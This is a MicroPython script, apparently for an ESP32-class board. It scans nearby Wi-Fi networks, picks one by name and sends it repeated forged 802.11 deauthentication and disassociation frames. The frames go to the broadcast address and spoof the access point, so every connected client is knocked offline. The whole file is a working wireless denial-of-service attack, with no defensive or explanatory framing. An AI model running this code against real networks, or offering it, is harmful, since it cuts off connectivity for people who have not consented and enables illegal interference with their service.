import network
import time
import uos
import wireless

def deauth(sta_if,_ap,_client,type,reason):
    # 0 - 1   type, subtype c0: deauth (a0: disassociate)
    # 2 - 3   duration (SDK takes care of that)
    # 4 - 9   reciever (target)
    # 10 - 15 source (ap)
    # 16 - 21 BSSID (ap)
    # 22 - 23 fragment & squence number
    # 24 - 25 reason code (1 = unspecified reason)
    packet=bytearray([0xC0,0x00,0x00,0x00,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,0x00, 0x00,0x01, 0x00])
    for i in range(0,6):
        packet[4 + i] =_client[i]
        packet[10 + i] = packet[16 + i] =_ap[i]
    #set type
    packet[0] = type;
    packet[24] = reason
    result=sta_if.send_pkt_freedom(packet)
    if result==0:
        time.sleep_ms(1)
        return True
    else:
        return False

def Attack(sta_if,vm,sendNum=100):
    _client=[0xFF,0xFF,0xFF,0xFF,0xFF,0xFF]#默认
    if sta_if.setAttack(vm[2]):
        print('Set Attack OK')
        print("Attack wifi",vm[0])
        time.sleep_ms(100)
        print('---deauth runing-----')
        for i in range(0,sendNum):
            r_=deauth(sta_if,vm[1], _client, 0xC0, 0x01)
            if r_:
                deauth(sta_if,vm[1], _client, 0xA0, 0x01)
                deauth(sta_if,_client, vm[1], 0xC0, 0x01)
                deauth(sta_if,_client, vm[1], 0xA0, 0x01)
                time.sleep_ms(5)
            else:
                print('---deauth fail-------')
            time.sleep_ms(3000)
    #默认3.1秒一次循环，差不多300秒一次
def sta_if():
    sta=wireless.attack(0)#0：STA 模式 1：AP模式
    sta.active(True)
    return sta 

def ap_list():
    sta=sta_if()
    li=sta.scan()
    for i in range(len(li)):
        for j in range(len(li)-i-1):
            if li[j][3]<li[j+1][3]:
                swap=li[j]
                li[j]=li[j+1]
                li[j+1]=swap
    return li
# sta_if=wireless.attack(0)#0：STA 模式 1：AP模式
# sta_if.active(True)
# ap_list=sta_if.scan()

# for i in ap_list:
#     print(i)

# attack(sta_if,ap_list[2],100)
def find_wifi(name):
    for i in ap_list():
        if i[0].decode("utf8")==str(name):
            return i
    return False

def death(name,t=100):
    ix=find_wifi(name)
    if ix:
        Attack(sta_if(),ix,t)
    else:
        print("no wifi")